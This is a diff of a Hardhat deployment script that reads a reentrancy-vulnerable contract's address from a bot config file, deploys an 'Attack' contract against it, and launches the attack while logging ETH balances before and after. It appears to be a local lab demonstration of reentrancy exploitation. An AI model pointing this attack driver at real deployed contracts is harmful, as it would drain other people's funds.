@@ -1,45 +1,46 @@
 import { network } from "hardhat";
+import fs from "fs";
+import { fileURLToPath } from "url";
 
 async function main() {
     const { ethers } = await network.connect();
     const [deployer] = await ethers.getSigners();
     console.log("Deployer:", deployer.address);
 
-    // 1. Deploy Vulnerable
-    const Vulnerable = await ethers.getContractFactory("Vulnerable");
-    const vulnerable = await Vulnerable.deploy();
-    await vulnerable.waitForDeployment();
-    const vulnAddress = await vulnerable.getAddress();
-    console.log("Vulnerable deployed at:", vulnAddress);
+    const configPath = fileURLToPath(new URL("../bot/config.json", import.meta.url));
+    const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
+    const entry = config.contracts.find(c => c.type === "reentrancy");
+    const vulnAddress = entry?.address;
 
-    // 2. Fund Vulnerable
-    await vulnerable.deposit({ value: ethers.parseEther("5") });
-    console.log("Funded Vulnerable with 5 ETH");
+    if (!vulnAddress) {
+        console.error("No Vulnerable address in config! Run scripts/deploy.js first.");
+        process.exit(1);
+    }
+    console.log("Using Vulnerable at:", vulnAddress);
 
-    // 3. Deploy Attacker
-    const Attack = await ethers.getContractFactory("Attack");
+    const Attack = await ethers.getContractFactory("contracts/Attacker.sol:Attack");
     const attack = await Attack.deploy(vulnAddress);
     await attack.waitForDeployment();
     const attackAddress = await attack.getAddress();
-    console.log("Attacker deployed at:", attackAddress);
+    console.log("Attack deployed at:", attackAddress);
 
-    // 4. Balances BEFORE
     let vulnBalance = await ethers.provider.getBalance(vulnAddress);
     let attackBalance = await ethers.provider.getBalance(attackAddress);
     console.log("\n=== BEFORE ATTACK ===");
-    console.log("Vulnerable:", ethers.formatEther(vulnBalance));
-    console.log("Attacker:  ", ethers.formatEther(attackBalance));
+    console.log("Vulnerable:", ethers.formatEther(vulnBalance), "ETH");
+    console.log("Attacker:  ", ethers.formatEther(attackBalance), "ETH");
 
-    // 5. Execute attack
+    console.log("\n🚨 LAUNCHING ATTACK...");
     const tx = await attack.attack({ value: ethers.parseEther("1"), gasLimit: 3000000 });
+    console.log("Attack TX:", tx.hash);
     await tx.wait();
+    console.log("Attack TX mined!");
 
-    // 6. Balances AFTER
     vulnBalance = await ethers.provider.getBalance(vulnAddress);
     attackBalance = await ethers.provider.getBalance(attackAddress);
     console.log("\n=== AFTER ATTACK ===");
-    console.log("Vulnerable:", ethers.formatEther(vulnBalance));
-    console.log("Attacker:  ", ethers.formatEther(attackBalance));
+    console.log("Vulnerable:", ethers.formatEther(vulnBalance), "ETH");
+    console.log("Attacker:  ", ethers.formatEther(attackBalance), "ETH");
 }
 
 main().catch(console.error);
